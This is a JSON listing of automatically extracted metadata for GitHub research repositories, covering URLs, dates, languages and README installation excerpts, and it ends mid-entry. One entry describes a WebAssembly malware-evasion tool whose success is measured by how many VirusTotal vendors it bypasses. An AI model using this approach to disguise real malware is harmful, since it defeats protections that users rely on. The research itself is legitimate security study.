{
    "0": {
        "filename": "anonymous2f4a9d_SARIF_FSE23_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/anonymous2f4a9d/SARIF_FSE23",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2023-02-05T19:22:41Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-04-25T07:33:47Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": "No programming languages found."
    },
    "1": {
        "filename": "UVA-DSA_APS_TestBed_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/UVA-DSA/APS_TestBed",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "    - Note: if you don't want to split doses between basal and bolus, pick one and set the other to 0 \n",
                    "original_header": "**UVA/Padova Simulator**"
                },
                "confidence": 0.9042875240081317,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/UVA-DSA/APS_TestBed/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2022-09-23T00:57:51Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-09-05T10:12:01Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 1449639
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "JavaScript",
                    "name": "JavaScript",
                    "type": "Programming_language",
                    "size": 28156
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "HTML",
                    "name": "HTML",
                    "type": "Programming_language",
                    "size": 14896
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Ruby",
                    "name": "Ruby",
                    "type": "Programming_language",
                    "size": 11608
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "CSS",
                    "name": "CSS",
                    "type": "Programming_language",
                    "size": 8270
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Mako",
                    "name": "Mako",
                    "type": "Programming_language",
                    "size": 3714
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 486
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "2": {
        "filename": "arducode-aes_arducode_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/arducode-aes/arducode",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2020-06-16T13:52:45Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2020-07-06T15:46:30Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": "No programming languages found."
    },
    "3": {
        "filename": "parasj_contracode_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/parasj/contracode",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "Dependencies: Python 3.7, NodeJS, NPM\n```bash\n$ npm install\n$ pip install -e \".\"\n$ python scripts/download_data.py\n```\n\n",
                    "type": "Text_excerpt",
                    "original_header": "Installation",
                    "parent_header": [
                        "Contrastive Code Representation Learning"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/parasj/contracode/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "<a href=\"https://parasj.github.io/contracode/\"><img src=\"https://parasj.github.io/contracode/assets/img/conceptual_ordered.png\"></a> \n",
                    "original_header": "**Learning functionality-based representations of programs**"
                },
                "confidence": 0.9999696868278273,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/parasj/contracode/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "Pretrain Transformer with ContraCode:\n```\npython representjs/pretrain_distributed.py pretrain_transformer \\\n  --num_epochs=200 --batch_size=96 --lr=1e-4 --num_workers=6 \\\n  --subword_regularization_alpha 0.1 --program_mode contrastive --label_mode contrastive --save_every 5000 \\\n  --train_filepath=/dev/shm/codesearchnet_javascript/javascript_augmented.pickle.gz \\\n  --spm_filepath=/dev/shm/codesearchnet_javascript/csnjs_8k_9995p_unigram_url.model \\\n  --min_alternatives 1 --dist_url tcp://localhost:10001 --rank 0\n``` \n",
                    "original_header": "Pretraining models with ContraCode"
                },
                "confidence": 0.9357453940681629,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/parasj/contracode/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "Commands to reproduce key type prediction results are provided below. In you are using pretraining checkpoints from the released checkpoints in the Google Drive, these commands should work without modification. However, if you pretrained the model from scratch, you will need to update the `--resume_path` argument. \n",
                    "original_header": "Finetuning and evaluating on downstream type prediction task"
                },
                "confidence": 0.994523786809182,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/parasj/contracode/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2020-04-21T00:23:21Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-08-06T08:50:11Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Jupyter Notebook",
                    "name": "Jupyter Notebook",
                    "type": "Programming_language",
                    "size": 1757459
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 295786
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 47330
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "JavaScript",
                    "name": "JavaScript",
                    "type": "Programming_language",
                    "size": 28462
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Makefile",
                    "name": "Makefile",
                    "type": "Programming_language",
                    "size": 156
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "4": {
        "filename": "ASSERT-KTH_wasm_evasion_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/ASSERT-KTH/wasm_evasion",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "- Clone this repo and its submodules `git clone --recursive`\n- Install Rust in your computer\n    - Set nightly as the version `rustup default nightly`\n    - Compile the analyzer tool `cd crates/evasor && cargo build`\n\n- As an alternative, you can download the [ubuntu release binary](https://github.com/Jacarte/obfuscation_wasm/releases/download/0.1.0/analyzer) `wget -O analyzer https://github.com/Jacarte/obfuscation_wasm/releases/download/0.1.0/evasor_linux_64amd`\n",
                    "type": "Text_excerpt",
                    "original_header": "Setup &amp; requirements",
                    "parent_header": [
                        "Malware evasion for Wasm"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/ASSERT-KTH/wasm_evasion/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "The `evasor` bin performs the evasion over an oracle. The oracle can be set with the `--oracle` option. The oracle argument should be another executable script or binary that receives a Wasm program as the first argument. The oracle binary should return exit code 0 if the binary evades, otherwise the exit code is used by the evasor as the numeric value returned by the fitness function. For example, to perform the evasion of VirusTotal, the exit code of the script is the number of bypassed vendors.\n \n",
                    "original_header": "Evasor"
                },
                "confidence": 0.9353785841880682,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/ASSERT-KTH/wasm_evasion/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2022-07-27T09:13:43Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-07-18T17:29:03Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "WebAssembly",
                    "name": "WebAssembly",
                    "type": "Programming_language",
                    "size": 83231175
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Jupyter Notebook",
                    "name": "Jupyter Notebook",
                    "type": "Programming_language",
                    "size": 64717961
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Rust",
                    "name": "Rust",
                    "type": "Programming_language",
                    "size": 2821730
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "C++",
                    "name": "C++",
                    "type": "Programming_language",
                    "size": 1822837
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 293774
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "HTML",
                    "name": "HTML",
                    "type": "Programming_language",
                    "size": 102910
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "JavaScript",
                    "name": "JavaScript",
                    "type": "Programming_language",
                    "size": 92909
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "C",
                    "name": "C",
                    "type": "Programming_language",
                    "size": 50083
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "TypeScript",
                    "name": "TypeScript",
                    "type": "Programming_language",
                    "size": 32741
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "CMake",
                    "name": "CMake",
                    "type": "Programming_language",
                    "size": 23395
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Roff",
                    "name": "Roff",
                    "type": "Programming_language",
                    "size": 17568
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 16368
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Makefile",
                    "name": "Makefile",
                    "type": "Programming_language",
                    "size": 5745
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Dockerfile",
                    "name": "Dockerfile",
                    "type": "Programming_language",
                    "size": 2661
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "CSS",
                    "name": "CSS",
                    "type": "Programming_language",
                    "size": 2203
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "5": {
        "filename": "squaresLab_melt_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/squaresLab/MELT",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "1. Create a python env.\n```bash\npython -m venv melt_env\nsource melt_env/bin/activate\n```\n\n2. Go to MELT's directory and install dependencies \n\n```bash\ncd MELT\npip install -r requirements.txt\n```\n\n3. Add MELT to PYTHONPATH\n```bash\nexport PYTHONPATH=$PYTHONPATH:`pwd`\n```\n",
                    "type": "Text_excerpt",
                    "original_header": "Set up your environment:",
                    "parent_header": [
                        "MELT"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/squaresLab/melt/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "The github action for MELT is found here: https://github.com/squaresLab/melt_action\n \n",
                    "original_header": "MELT"
                },
                "confidence": 0.9992912846892614,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/squaresLab/melt/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2023-08-25T03:45:46Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-08-23T16:46:31Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 95550
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "6": {
        "filename": "FoRTE-Research_UnTracer-AFL_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/FoRTE-Research/UnTracer-AFL",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "```\nexport DYNINST_INSTALL=/path/to/dynBuildDir\nexport UNTRACER_AFL_PATH=/path/to/Untracer-AFL\n\nexport DYNINSTAPI_RT_LIB=$DYNINST_INSTALL/lib/libdyninstAPI_RT.so\nexport LD_LIBRARY_PATH=$DYNINST_INSTALL/lib:$UNTRACER_AFL_PATH\nexport PATH=$PATH:$UNTRACER_AFL_PATH\n```\n",
                    "type": "Text_excerpt",
                    "original_header": "3. Configure environment variables",
                    "parent_header": [
                        "UnTracer-AFL",
                        "INSTALLATION"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/FoRTE-Research/UnTracer-AFL/master/readme.md"
            },
            {
                "result": {
                    "value": "Update `DYN_ROOT` in `UnTracer-AFL/Makefile` to your Dyninst install directory. \nThen, run the following commands:\n```\nmake clean && make all\n```\n",
                    "type": "Text_excerpt",
                    "original_header": "4. Build UnTracer-AFL",
                    "parent_header": [
                        "UnTracer-AFL",
                        "INSTALLATION"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/FoRTE-Research/UnTracer-AFL/master/readme.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "#\n<p align=center> <a href=\"https://www.cs.vt.edu\"><img border=\"0\" src=\"http://people.cs.vt.edu/snagy2/img/vt_inline_computer_science.png\" width=\"60%\" height=\"60%\">\n</a> </p>\n \n"
                },
                "confidence": 0.9973293212762484,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/FoRTE-Research/UnTracer-AFL/master/readme.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2018-11-03T06:36:17Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-03-24T11:40:38Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "C",
                    "name": "C",
                    "type": "Programming_language",
                    "size": 306665
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "C++",
                    "name": "C++",
                    "type": "Programming_language",
                    "size": 21835
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Makefile",
                    "name": "Makefile",
                    "type": "Programming_language",
                    "size": 6971
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 4913
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Rich Text Format",
                    "name": "Rich Text Format",
                    "type": "Programming_language",
                    "size": 21
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "JavaScript",
                    "name": "JavaScript",
                    "type": "Programming_language",
                    "size": 20
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "7": {
        "filename": "evidencebp_follow-your-nose_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/evidencebp/follow-your-nose",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "\nIn order to replicate follow code/python/main.py \n"
                },
                "confidence": 0.9282005758860878,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/evidencebp/follow-your-nose/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2021-03-01T17:58:17Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-02-06T18:50:51Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "HTML",
                    "name": "HTML",
                    "type": "Programming_language",
                    "size": 174156
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 132755
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 132548
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "CSS",
                    "name": "CSS",
                    "type": "Programming_language",
                    "size": 9804
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "JavaScript",
                    "name": "JavaScript",
                    "type": "Programming_language",
                    "size": 2962
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "8": {
        "filename": "yusufsn_DifferentDiffAlgorithms_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/yusufsn/DifferentDiffAlgorithms",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "# HOW TO RUN\n\n### Requirements\n1. `python 3`\n2. `jupyter notebook`\n\n### Procedure:\n1. Clone this repository into your userhome folder in the system :\n   ```\n   git clone https://github.com/yusufsn/DifferentDiffAlgorithms.git\n   ```\n   output: `/Users/<yourusername>/DifferentDiffAlgorithms/`\n2. Change the directory into `SZZ`, and create a new directory `datasource`. \n   \n   ```\n   cd DifferentDiffAlgorithms/SZZ/\n   \n   mkdir datasource\n   ```\n3. Change the directory into `datasource`, then clone a target repository from GitHub, e.g. `Apache ActiveMQ`.\n   \n   ```\n   git clone https://github.com/apache/activemq.git datasource/activemq\n   ```\n   \n4. Run `jupyter notebook`.\n5. In the `jupyter notebook`, open all source code files in the directory `code_document`.\n6. Only for source code file no. 00, put the exact name of the cloned repository in the variable named `project` and the project key / bug identifier in the variable `bugidentifier`. Different projects have different bug identifiers.\n   e.g. For `Apache ActiveMQ` project -> `project = \"activemq\"`, `bugidentifier = \"AMQ\"`\n7. Run all cells in all source code files from number `00` to number `10` sequentially.\n8. The summary results of the SZZ implementation for each project are saved in CSV format in the directory of `~/DifferentDiffAlgorithms/SZZ/project_analyses/<yourtargetedprojectname>/05_validation/05_stats/`.\n9. Repeat step 3 to 8 for different projects.\n",
                    "type": "File_dump"
                },
                "confidence": 1,
                "technique": "file_exploration",
                "source": "https://raw.githubusercontent.com/yusufsn/DifferentDiffAlgorithms/master/SZZ/INSTALL.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2018-11-14T04:48:38Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2023-01-09T21:06:58Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Jupyter Notebook",
                    "name": "Jupyter Notebook",
                    "type": "Programming_language",
                    "size": 218530
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "9": {
        "filename": "pgadient_AndroidLintSecurityChecks_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/pgadient/AndroidLintSecurityChecks",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "The .jar file (available precompiled in the release folder) has to be copied into a specific folder:\n* On *nix operating systems into `~/.android/lint/`\n* On Windows Vista or newer into `C:\\Users\\CurrentUserProfile\\.android\\lint\\`\n",
                    "type": "Text_excerpt",
                    "original_header": "Manual Installation",
                    "parent_header": [
                        "AndroidLintSecurityChecks"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/pgadient/AndroidLintSecurityChecks/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "Id|ICC Security Code Smell|Brief Description\n:-:|:-:|-\nSM01|Persisted Dynamic Permission|URI permissions granted through the context class have to be revoked explicitly\nSM02|Custom Scheme Channel|Avoid using custom URI schemes\nSM03|Incorrect Protection Level|The `android:protectionLevel` attribute is missing for a custom permission\nSM04|Unauthorized Intent|Avoid sending implicit intents if possible\nSM05|Sticky Broadcast|The usage of sticky broadcasts is strongly discouraged\nSM06|Slack WebViewClient|The default `WebViewClient` does not perform any restrictions on web pages\nSM07|Broken Service Permission|Self permission checks could fail\nSM08|Insecure Path Permission|Avoid using path permission together with UriMatcher in a content provider\nSM09|Broken Path Permission Precedence|Path permissions cannot be used to make certain provider paths more secure, if the provider already defines a permission\nSM10|Unprotected Broadcast Receiver|A broadcast receiver is dynamically registered without any permission\nSM11|Implicit Pending Intent|Using an implicit intent for a pending intent\nSM12|Common Task Affinity|Consider setting the task affinity of your app explicitly to an empty value\n \n",
                    "original_header": "Implemented Checks"
                },
                "confidence": 0.9998752005621819,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/pgadient/AndroidLintSecurityChecks/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2018-05-07T06:12:42Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-03-30T09:45:14Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Java",
                    "name": "Java",
                    "type": "Programming_language",
                    "size": 296044
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "10": {
        "filename": "smartbugs_smartbugs-results_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/smartbugs/smartbugs-results",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "|  #  | Tool       | Avg. Execution Time | Total Execution Time |\n| --- | ---------- | ------------------- | -------------------- |\n|   1 | Honeybadger | 0:00:46    | 0:53:11    |\n|   2 | Maian      | 0:02:57    | 3:23:50    |\n|   3 | Manticore  | 0:08:11    | 5:03:04    |\n|   4 | Mythril    | 0:01:13    | 1:23:42    |\n|   5 | Osiris     | 0:00:44    | 0:50:03    |\n|   6 | Oyente     | 0:00:36    | 0:41:29    |\n|   7 | Securify   | 0:01:00    | 1:09:08    |\n|   8 | Slither    | 0:00:03    | 0:03:35    |\n|   9 | Smartcheck | 0:00:06    | 0:06:34    | \n",
                    "original_header": "Execution Time Stats"
                },
                "confidence": 0.9875240153265377,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/smartbugs/smartbugs-results/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2019-07-18T14:41:38Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-09-29T15:28:48Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": "No programming languages found."
    },
    "11": {
        "filename": "Attn-to-FC_Attn-to-FC_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/Attn-to-FC/Attn-to-FC",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2019-08-23T15:31:09Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-03-14T15:54:40Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 200076
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 730
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "12": {
        "filename": "neulab_incremental_tree_edit_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/neulab/incremental_tree_edit",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "We recommend using `conda` to manage the environment:\n```\nconda env create -n \"structural_edits\" -f structural_edits.yml\nconda activate structural_edits\n```\n\nInstall the punkt tokenizer:\n```\npython\n>>> import nltk\n>>> nltk.download('punkt')\n>>> <ctrl-D>\n```\n",
                    "type": "Text_excerpt",
                    "original_header": "1. Prepare Environment",
                    "parent_header": [
                        "Learning Structural Edits via Incremental Tree Transformations"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/neulab/incremental_tree_edit/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "Please extract the datasets and vocabulary files by:\n```\ncd source_data\ntar -xzvf githubedits.tar.gz\n``` \n",
                    "original_header": "2. Data"
                },
                "confidence": 0.9998330703624331,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/neulab/incremental_tree_edit/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "See training and test scripts in `scripts/githubedits/`. Please configure the `PYTHONPATH` environment variable in line 6.\n  \n",
                    "original_header": "3. Experiments"
                },
                "confidence": 0.9985053246401927,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/neulab/incremental_tree_edit/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "To further train the model with PostRefine imitation learning, \nplease replace `FOLDER_OF_SUPERVISED_PRETRAINED_MODEL` with your model dir in `source_data/githubedits/configs/graph2iteredit.seq_edit_encoder.20p.postrefine.imitation.json`.\nUncomment only line 27-31 in `scripts/githubedits/train.sh` and run:\n```\nbash scripts/githubedits/train.sh source_data/githubedits/configs/graph2iteredit.seq_edit_encoder.20p.postrefine.imitation.json\n```\nNote that `--small_memory` cannot be used in this setting.\n \n",
                    "original_header": "3.1.2 Imitation Learning"
                },
                "confidence": 0.9305972989480313,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/neulab/incremental_tree_edit/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2021-01-22T21:40:38Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-02-15T04:49:45Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 681127
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 2785
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "13": {
        "filename": "yueyueL_ReliableLM4Code_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/yueyueL/ReliableLM4Code",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "- Release Date: 2022-04 \n",
                    "original_header": "GPT-NeoX"
                },
                "confidence": 0.9844239495142332,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/yueyueL/ReliableLM4Code/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "### GPT-Neo\n- Release Date: 2021-03\n- Source: [Github](https://github.com/EleutherAI/gpt-neo)\n \n",
                    "original_header": "GPT-Neo"
                },
                "confidence": 0.9813954059633565,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/yueyueL/ReliableLM4Code/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "- Release Date: 2022-11\n- Access: [demo](https://openai.com/blog/chatgpt/), [api](https://share.hsforms.com/1u4goaXwDRKC9-x9IvKno0A4sk30)\n- Origin: [Blog](https://openai.com/blog/chatgpt/)\n \n",
                    "original_header": "ChatGPT"
                },
                "confidence": 0.9152353566368197,
                "technique": "supervised_classification",
